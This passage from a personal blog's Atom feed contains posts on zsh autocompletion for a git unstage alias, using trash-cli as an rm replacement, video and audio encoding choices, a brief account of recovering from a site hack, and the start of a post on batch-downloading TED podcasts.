with &lt;code&gt;git unstage&lt;/code&gt;&lt;/p&gt;

&lt;h2&gt;Autocompletion&lt;/h2&gt;

&lt;p&gt;At this point, &lt;code&gt;git unstage&lt;/code&gt; autocompletion does not work. It simply suggest
all files in the current directory, while I&amp;#39;d like it to suggest only files in
the staging area.&lt;/p&gt;

&lt;p&gt;When you create a git alias, you cannot simply add a zsh autocomplete method
for that alias (meaning, you cannot create a &lt;code&gt;_git-unstage&lt;/code&gt; method), you have
to hook your custom autocomplete logic to the underlying git method your alias
refers to. In this case, this is the &lt;code&gt;git reset&lt;/code&gt; method.&lt;/p&gt;

&lt;p&gt;So, I created my own &lt;code&gt;_git-reset&lt;/code&gt; autocompletion function. Actually, I
borrowed the one already defined in
&lt;code&gt;/usr/share/zsh/functions/Completion/Unix/_git&lt;/code&gt; and tweaked it a little bit.&lt;/p&gt;

&lt;p&gt;I created a file named &lt;code&gt;_git-reset&lt;/code&gt; and put it in my &lt;code&gt;$FPATH&lt;/code&gt; so zsh will load
it when asked for autocompletion and it will overwrite the &lt;code&gt;_git-reset&lt;/code&gt; method
already defined in &lt;code&gt;_git&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Here is the full content of the file :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;c&quot;&gt;#compdef git-reset&lt;/span&gt;

_git-reset &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;curcontext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$curcontext&lt;/span&gt; state line
    &lt;span class=&quot;nb&quot;&gt;typeset&lt;/span&gt; -A opt_args

    _arguments -C -S -A &lt;span class=&quot;s1&quot;&gt;&amp;#39;-*&amp;#39;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;&amp;#39;(-q --quiet)&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;-q,--quiet&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;[be quiet, only report errors]&amp;#39;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;&amp;#39;::commit:__git_revisions&amp;#39;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
        - reset-head &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;&amp;#39;(        --soft --hard --merge --keep)--mixed[reset the index but not the working tree (default)]&amp;#39;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;&amp;#39;(--mixed        --hard --merge --keep)--soft[do not touch the index file nor the working tree]&amp;#39;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;&amp;#39;(--mixed --soft        --merge --keep)--hard[match the working tree and index to the given tree]&amp;#39;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;&amp;#39;(--mixed --soft --hard         --keep)--merge[reset out of a conflicted merge]&amp;#39;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;&amp;#39;(--mixed --soft --hard --merge       )--keep[like --hard, but keep local working tree changes]&amp;#39;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
        - reset-paths &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;&amp;#39;(-p --patch)&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;-p,--patch&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;[select diff hunks to remove from the index]&amp;#39;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;&amp;#39;*::file:-&amp;gt;files&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0

    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$state&lt;/span&gt; in
        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;files&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;commit
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; -n &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; __git_is_committish &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;commit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;commit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;HEAD
            &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;# Suggest files in index if `git reset HEAD`&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; HEAD &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;                &lt;/span&gt;__git_changed_files
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;                &lt;/span&gt;__git_tree_files . &lt;span class=&quot;nv&quot;&gt;$commit&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
            &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

_git-reset &lt;span class=&quot;s2&quot;&gt;&amp;quot;$@&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As you may have noticed this script is an almost exact copy/paste from the
original &lt;code&gt;_git-reset&lt;/code&gt; script. The only modification I&amp;#39;ve done is in those
lines :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Suggest files in index if `git reset HEAD`&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; HEAD &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;    &lt;/span&gt;__git_changed_files
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;    &lt;/span&gt;__git_tree_files . &lt;span class=&quot;nv&quot;&gt;$commit&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;What it does is checking the first argument of &lt;code&gt;git reset&lt;/code&gt;, and if it&amp;#39;s
&lt;code&gt;HEAD&lt;/code&gt;, it suggests files in the staging area (&lt;code&gt;__git_changed_files&lt;/code&gt;) instead
of files in the current repo (&lt;code&gt;__git_tree_files&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;It took me quite a bit of time to figure out which method to use to get files
in the staging area as I had been looking for a &lt;code&gt;__git_staged_files&lt;/code&gt; for quite
a while and finally discovered that the &lt;code&gt;__git_changed_files&lt;/code&gt; was actually
what I was looking for.&lt;/p&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;The &lt;code&gt;git unstage&lt;/code&gt; alias is quite common, you can find it in a lot of books and
websites teaching git. But it becomes much more usable once zsh does the
autocomplete for you and you can easily select files to unstage that way.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Use the system trash with ZSH terminal</title>
   <link href="http://blog.pixelastic.com/2012/08/20/system-trash-zsh-terminal/"/>
   <updated>2012-08-20T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2012/08/20/system-trash-zsh-terminal</id>
   <content type="html">&lt;p&gt;When you start using the terminal as your main file explorer instead of a GUI
one, you soon discover two important things.&lt;/p&gt;

&lt;p&gt;First, it is much faster to browse accross your filesystem, copying and moving
files in the terminal that it is with your mouse. This is hard to believe at
first (how can writing text on a dull black screen be faster than
drag&amp;#39;n&amp;#39;dropping ?) but it is nonetheless true (after a bit of practice, sure).&lt;/p&gt;

&lt;p&gt;The second thing is that it is also much much easier to *&lt;em&gt;permanently delete
very important files *&lt;/em&gt;as deleting a file through the terminal has no trash
bin nor any other safeguard mechanism.&lt;/p&gt;

&lt;h2&gt;Scripting a rm replacement&lt;/h2&gt;

&lt;p&gt;At first, I scripted my own rm &lt;code&gt;rm&lt;/code&gt; replacement that was manually moving files
to &lt;code&gt;~/.local/share/Trash/files&lt;/code&gt; (the common Trash directory) instead of
deleting them. But it was a bit naive and couldn&amp;#39;t really work on removable
drives nor provide a &amp;quot;restore&amp;quot; mechanism.&lt;/p&gt;

&lt;p&gt;Fortunatly, the &lt;code&gt;trash-cli&lt;/code&gt; package on Ubuntu provides a set of methods to
deal with the trash from the command line. They have very explicit names such
as &lt;code&gt;trash&lt;/code&gt;, &lt;code&gt;list-trash&lt;/code&gt;, &lt;code&gt;restore-trash&lt;/code&gt; or &lt;code&gt;empty-trash&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;ZSH aliases&lt;/h2&gt;

&lt;p&gt;I had to resort to quite a bit of ZSH tweaking to make it a perfect &lt;code&gt;rm&lt;/code&gt;
replacement. First, I added a simple alias for the &lt;code&gt;rm&lt;/code&gt; command.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;trash&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then I also wanted to change the default &lt;code&gt;rmdir&lt;/code&gt; command. I could have used
the same type of alias (&lt;code&gt;alias rmdir=&amp;#39;trash&amp;#39;&lt;/code&gt;) but I would have lost the
builtin ZSH autocompletion of directories zsh provides with &lt;code&gt;rmdir&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;When you define aliases with ZSH, you can choose if you want it to
autocomplete based on the right hand side of your alias
(&lt;code&gt;NO_COMPLETE_ALIASES&lt;/code&gt;) or the left hand side (&lt;code&gt;COMPLETE_ALIASES&lt;/code&gt;). Yes, the
name of the options seem wrong to me too, but this is actually how it works.&lt;/p&gt;

&lt;p&gt;I prefer setting &lt;code&gt;NO_COMPLETE_ALIASES&lt;/code&gt; so I can use the correct autocompletion
on my commands with my aliases, but for the &lt;code&gt;rmdir&lt;/code&gt; case this was proving to
be an issue.&lt;/p&gt;

&lt;h2&gt;rmdir autocompletion&lt;/h2&gt;

&lt;p&gt;So, I started writing my own &lt;code&gt;rmdir&lt;/code&gt; implementation in a custom script. This
was merely a wrapper to &lt;code&gt;rmdir&lt;/code&gt; but putting it in its own script allowed me to
change its name and thus changing its autocomplete method.&lt;/p&gt;

&lt;p&gt;I named it &lt;code&gt;better-rmdir&lt;/code&gt;, and put it in my &lt;code&gt;$PATH&lt;/code&gt;. Here is the code&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/zsh&lt;/span&gt;
trash &lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As you can see, this is just a wrapper, taking the initial arguments and
passing them to &lt;code&gt;trash&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;But I also created a file named &lt;code&gt;_better-rmdir&lt;/code&gt; and put it in my &lt;code&gt;$FPATH&lt;/code&gt;
(this is where ZSH goes looking to autocomplete methods). I just copied the
code of the original &lt;code&gt;_directories&lt;/code&gt; method (that you can probably find in
&lt;code&gt;/usr/share/zsh/functions/Completion/Unix/&lt;/code&gt;), and adapted it to fit my newly
created &lt;code&gt;better-rmdir&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;c&quot;&gt;#compdef better-rmdir&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;expl
_wanted directories expl directory _files -/ &lt;span class=&quot;s2&quot;&gt;&amp;quot;$@&amp;quot;&lt;/span&gt; -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And finally, I added an alias (&lt;code&gt;alias rmdir=&amp;#39;better-rmdir&amp;#39;&lt;/code&gt;) and everytime I
ask for an autocomplete on &lt;code&gt;rmdir&lt;/code&gt; it actually looks for the autocomplete of
&lt;code&gt;better-rmdir&lt;/code&gt;, which is the code contained in &lt;code&gt;_better-rmdir&lt;/code&gt; and which in
turn return only directories.&lt;/p&gt;

&lt;p&gt;Now I have complete &lt;code&gt;rm&lt;/code&gt; and &lt;code&gt;rmdir&lt;/code&gt; commands in my terminal that move files
to the trash.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>A small note about video encoding and formats</title>
   <link href="http://blog.pixelastic.com/2012/08/09/small-note-video-encoding-formats/"/>
   <updated>2012-08-09T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2012/08/09/small-note-video-encoding-formats</id>
   <content type="html">&lt;p&gt;Following my previous note on audio files, I made some research on video
files. I have a huge amount of video on my hard drive, so much that I actually
needed to do a bit of cleaning.&lt;/p&gt;

&lt;p&gt;That&amp;#39;s when I discovered that I had a plethora of different file formats
(&lt;code&gt;avi&lt;/code&gt;, &lt;code&gt;mp4&lt;/code&gt;, &lt;code&gt;mkv&lt;/code&gt;) and in various resolution, quality and filesize. Also,
filesize was not always dependent on quality. I had some really heavy files
that were not better looking that smaller one.&lt;/p&gt;

&lt;p&gt;So I started some research on the Wikipedia and Google to understand more
about all those fileformats, and here are my results.&lt;/p&gt;

&lt;h2&gt;Containers&lt;/h2&gt;

&lt;p&gt;First of all, the &lt;code&gt;avi&lt;/code&gt;, &lt;code&gt;mp4&lt;/code&gt; or &lt;code&gt;mkv&lt;/code&gt; file extension denote a container
format. This container is just a box that contain video and audio stream. Not
all boxes are created equal, though.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;avi&lt;/code&gt; is a Microsoft container but gained (in)famous popularity in the first
days of p2p filesharing. This is a very simple container, able to hold one
video and one audio stream. Then, was created the &lt;code&gt;mp4&lt;/code&gt; container. This one is
an ISO box, so already much better than the Microsoft one. This actually is a
good container, allowing the use of several audio and videos streams as well
as subtitles.&lt;/p&gt;

&lt;p&gt;Then, came the &lt;code&gt;mkv&lt;/code&gt; container. It is as good as &lt;code&gt;mp4&lt;/code&gt;, and even allow more
customization, but the important point is that it is patent free. The only
downside to &lt;code&gt;mkv&lt;/code&gt; is that it is not as widely supported as the other two
format, but the specs being public and open, this is slowly changing.&lt;/p&gt;

&lt;p&gt;I also had some other extensions, like &lt;code&gt;wmv&lt;/code&gt;, &lt;code&gt;mov&lt;/code&gt; or &lt;code&gt;divx&lt;/code&gt;. &lt;code&gt;divx&lt;/code&gt; is only
an &lt;code&gt;avi&lt;/code&gt; in disguise, because of legal reasons. &lt;code&gt;wmv&lt;/code&gt; is another Microsoft
container, this one being an improved &lt;code&gt;avi&lt;/code&gt; with DRM. &lt;code&gt;mov&lt;/code&gt; is an Apple
container, aimed to media creation. A &lt;code&gt;mov&lt;/code&gt; is actually quite a powerful
container, that could be used for much more than simply media playback but
also media creation.&lt;/p&gt;

&lt;p&gt;If I had to choose, I&amp;#39;ll pick mkv.&lt;/p&gt;

&lt;h2&gt;Video codecs&lt;/h2&gt;

&lt;p&gt;Now, what do we put in those boxes ? First, a video stream. We could put an
uncompressed video stream in it, but this will result in huge filesize, so we
actually never do that.&lt;/p&gt;

&lt;p&gt;Instead, we use codec (short for &lt;em&gt;coder/decoder&lt;/em&gt;) to compress this stream in
something with a more manageable size. The most famous is DivX. DivX started
as an encoder hacked from Microsoft first avi files and was heavily used to
encode movies before sharing them online. Because of legal dispute with
Microsoft, the guys that created DivX had to recode it from scratch. In the
meantime, an opensource fork of DivX, named Xvid was created and after a few
version became even better than the original Divx.&lt;/p&gt;

&lt;p&gt;MPEG, MPEG2 and MPEG4 are succesive iteration of another codec that compress a
video stream by looking at its pixels and checking if they changed from one
frame to another, to avoid redrawing them. With each succesive versions it
then started to track movement, color and lightning of these pixels. In the
end, it gave birth to the h264 codec which is used on Blueray (while MPEG2 was
used on DVD). h264 is the de facto standard of HD video of today. It requires
more processing power than its MPEG counterparts but deliver a much better
quality for an equal filesize. Recent hardware is today optimized to handle
h264 natively.&lt;/p&gt;

&lt;p&gt;As for mkv and mp4, there also is the same difference between H264 and Theora.
Theora got equivalent quality than H264, but is patentfree. On the other end,
H264 is very widely supported while Theora is not (as can be seen in HTML5).&lt;/p&gt;

&lt;p&gt;Microsoft also created a closed source wmv codec to go with its wmv container.
It is supposed to be based on MPEG4, but there is little known to it, so it of
absolutly no use to me.&lt;/p&gt;

&lt;p&gt;So, as you can see, there is almost no relation between a codec and its
container. You can have a divx encoded file in an mkv, or a Theora in an avi.
But, in the real world, some codec are most often found with some container,
like divx in avi or h264 in mp4.&lt;/p&gt;

&lt;p&gt;Here, I&amp;#39;ll pick h264 because of the hardware support.&lt;/p&gt;

&lt;h2&gt;Audio codec&lt;/h2&gt;

&lt;p&gt;As for the video stream, the audio stream is also compressed using an audio
codec. The most common audio codec is the mp3. This is a lossy codec, meaning
it discards information to get the filesize lower. It is based on a method
that will discard sounds that the human hear will not be able to hear anyway.&lt;/p&gt;

&lt;p&gt;mp3 has its drawbacks, like being bloated from succesive mpeg versions and
still being patented.&lt;/p&gt;

&lt;p&gt;A new codec, the AAC succeed to mp3. It will also discard sounds the human
hear cannot get, but will also encode redundancy in a better way. Even if mp3
was the de facto standard for a long time, AAC is gaining a huge popularity
because it is backed up by all the big companies.&lt;/p&gt;

&lt;p&gt;Then, the story gÄ¹Âs on and on. There is an open source, patent free
equivalent to AAC, being ogg. Once again, its as good as its opponent (even
better on low bitrates), but there isn&amp;#39;t as many devices able to read ogg as
they&amp;#39;re are able to read AAC. But once, again, things are slowly changing.&lt;/p&gt;

&lt;p&gt;Here, I&amp;#39;ll choose ogg over the alternatives.&lt;/p&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;I have a bunch of files, in different containers, encoded with different
encoders and I&amp;#39;m going to try to clean a bit all this. First, I&amp;#39;ll get rid of
all the &amp;quot;bad&amp;quot; containers (&lt;code&gt;mov&lt;/code&gt; and &lt;code&gt;wmv&lt;/code&gt;) and use &lt;code&gt;mkv&lt;/code&gt; instead.&lt;/p&gt;

&lt;p&gt;For files that are too big, I&amp;#39;ll try to convert them to a better format. h264
video with an ogg audio stream in an mkv container.&lt;/p&gt;

&lt;p&gt;Well, there also is the matter of the video resolution, data rate, fps and
audio frequency but this might be the subject of another post.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>How I want my music files encoded</title>
   <link href="http://blog.pixelastic.com/2012/06/04/music-files-encoded/"/>
   <updated>2012-06-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2012/06/04/music-files-encoded</id>
   <content type="html">&lt;p&gt;I have a lot of music files on my computer. Some comes from CDs I encoded,
other comes from the magic of file sharing. Most of them are in &lt;code&gt;MP3&lt;/code&gt; format,
but I have a few &lt;code&gt;ogg&lt;/code&gt; and &lt;code&gt;wma&lt;/code&gt; tracks, mixed with even a bit of &lt;code&gt;wav&lt;/code&gt; or
&lt;code&gt;flac&lt;/code&gt; files.&lt;/p&gt;

&lt;p&gt;Even the &lt;code&gt;mp3&lt;/code&gt; files are encoded in a bunch of different settings, with
various bitrates and frequencies. The only thing that is quite consistent in
all that is that my tagging of metadatas.&lt;/p&gt;

&lt;p&gt;Other than that it&amp;#39;s quite a mess and has my collection grow larger, it starts
to bother me. No two albums, even for the same music duration, are the same
filesize.&lt;/p&gt;

&lt;p&gt;I decided to clean a bit this whole mess. Let me explain my goal, and how I
plan on doing that.&lt;/p&gt;

&lt;p&gt;First, I want all my files encoded with the same settings, so the music I&amp;#39;m
listening to and its file size is consistent accross different albums.&lt;/p&gt;

&lt;p&gt;Second, I want all the files correctly taggued with track number, artist,
album and song name. I don&amp;#39;t really care about the year nor the genre. Genre
is highly subjective, and year can be misleading in mixed albums like
soundtracks, are we talking about the year of the release of the cd, or the
year of the release of the individual song?&lt;/p&gt;

&lt;p&gt;Third, I want all my files in &lt;code&gt;ogg&lt;/code&gt; format. First, because I want to get rid
of as many proprietary format as I can, and &lt;code&gt;mp3&lt;/code&gt; is proprietary. But mainly
because &lt;code&gt;mp3&lt;/code&gt; is an encoding format bloated with the previous layers of MPEG
layer 2 and MPEG layer 1, resulting in larger file size and more encoding
complexity.&lt;/p&gt;

&lt;p&gt;And finally, I want to have the best sound quality that I can afford, without
going to extreme like listening to &lt;code&gt;FLAC&lt;/code&gt; directly as my ears won&amp;#39;t be able to
catch the difference anyway.&lt;/p&gt;

&lt;p&gt;So, I&amp;#39;m gonna buy a big hard drive, something around 1To I think, and put on
it all my music files in &lt;code&gt;FLAC&lt;/code&gt; format, encoded directly from CD. This &lt;code&gt;FLAC&lt;/code&gt;
files will have all the required metadata saved in them.&lt;/p&gt;

&lt;p&gt;Then, I&amp;#39;ll create an &lt;code&gt;ogg&lt;/code&gt; subdir in each of my album dirs where I&amp;#39;ll encode
my FLAC in &lt;code&gt;ogg&lt;/code&gt; with a bitrate of 128kbds (as the human hear won&amp;#39;t be able to
really get the difference with anything higher than that), and using the
metadata from the &lt;code&gt;FLAC&lt;/code&gt; files.&lt;/p&gt;

&lt;p&gt;Finally, I&amp;#39;ll put the &lt;code&gt;ogg&lt;/code&gt; files on my portable media player and listen to
them on the go.&lt;/p&gt;

&lt;p&gt;I do not need to put the &lt;code&gt;FLAC&lt;/code&gt; on the PMP, has my ears won&amp;#39;t be able to hear
the difference. I only need to put a compressed version. Maybe in a few years,
when PMP hard drive size will have increase I&amp;#39;ll be able to increase the
quality of my &lt;code&gt;ogg&lt;/code&gt; and use better quality files. If I ever need to do that, I
won&amp;#39;t have to rip the CDs again as I&amp;#39;ll already have the &lt;code&gt;FLAC&lt;/code&gt; to create the
encoding.&lt;/p&gt;

&lt;p&gt;This will be hard work, but I guess it will be worth it in the long run. At
least, now I know a bit more about encoding formats and settings.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>This blog got hacked</title>
   <link href="http://blog.pixelastic.com/2012/02/25/blog-hacked/"/>
   <updated>2012-02-25T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2012/02/25/blog-hacked</id>
   <content type="html">&lt;p&gt;Today, at about 9pm (GMT+12), I found my own blog hacked. When I wanted to
access it, I was redirected to a malware site.&lt;/p&gt;

&lt;p&gt;Half an hour later, it is back online again, and here is what I did.&lt;/p&gt;

&lt;p&gt;First, I downloaded the webpage on my computer usingÂ &lt;code&gt;curl
http://www.pixelastic.com/&lt;/code&gt;to analyse it in search of a clue on the attack
vector.&lt;/p&gt;

&lt;p&gt;Unfortunatly, I couldn&amp;#39;t easily find the culprit. No &lt;code&gt;img&lt;/code&gt; tag loading a &lt;code&gt;php&lt;/code&gt;
file, no XSS injection that I could find. My guess is that the attacker
tampered the &lt;code&gt;js&lt;/code&gt; files loaded to add its own custom evil script. But as my js
files are concatened and compressed in a file with a md5 name, it wasn&amp;#39;t
obvious that they had been compromised.&lt;/p&gt;

&lt;p&gt;After that, I &lt;code&gt;ssh&lt;/code&gt;ed to the server and tried to find what files where
modified since my last commit. As I&amp;#39;m using Mercurial for that, this was a
simple matter ofÂ &lt;code&gt;hg status.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And I got a shitload of result. Actually, all my &lt;code&gt;php&lt;/code&gt; files had been modified
(and as I&amp;#39;m using cakePHP, that means, a lot of file). Running &lt;code&gt;hg diff&lt;/code&gt;, I
found out that all the php code of each file had been replaced with an evil
code (enclosed in several layers of eval+base64).&lt;/p&gt;

&lt;p&gt;I updated my working directory to the latest commit with &lt;code&gt;hg update --clean&lt;/code&gt;
to get all those files as they were before the attack. Running &lt;code&gt;hg status&lt;/code&gt;
once more still showed a bunch of new php files added. Running &lt;code&gt;hg purge&lt;/code&gt;
finally get rid of them.&lt;/p&gt;

&lt;p&gt;I finally deleted all the compressed css and js files, to force them to be
created again, and that&amp;#39;s it, the website is online again.&lt;/p&gt;

&lt;p&gt;I still don&amp;#39;t have a clue on how this happened. How did someone access my
files ? Is that an XSS attack ? Is my password cracked ? Is there another
security weakness I&amp;#39;m not aware of ?&lt;/p&gt;

&lt;p&gt;EDIT : Got hacked again. Seeing that the cakePHP Cache files were deleted, I
guess it is a known attack on a cake vulnerability. Got the website up again,
but will fix it as soon as my holidays allow.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Downloading all the TEDTalk podcasts</title>
   <link href="http://blog.pixelastic.com/2012/01/23/putting-tedtalk-mp3-player/"/>
   <updated>2012-01-23T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2012/01/23/putting-tedtalk-mp3-player</id>
   <content type="html">&lt;p&gt;As I&amp;#39;m about to move for a couple of long months without an internet
connection and a lot of travel hours, I thought of downloading the TEDTalk
podcasts.&lt;/p&gt;

&lt;p&gt;Being a linux user for about a year now, I&amp;#39;m taking the habit of using the
linux tools to do the boring and repetitive work. Downloading more than a
hundred files seems like a good candidate for a script.&lt;/p&gt;

&lt;p&gt;The complete list of audio podcasts is available &lt;a href=&quot;https://spreadsheets.g%0Aoogle.com/pub?key=0Ahz_ZQm7pkwTdFBVWXBLOFNGSkdsVFgxc0Y0bk9lc0E&quot;&gt;here&lt;/a&gt;. I simply
selected all text and copied it into a &lt;code&gt;file.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then, it was simply a matter of extracting only the urls, and feeding them to
&lt;code&gt;wget&lt;/code&gt;&lt;/p&gt;
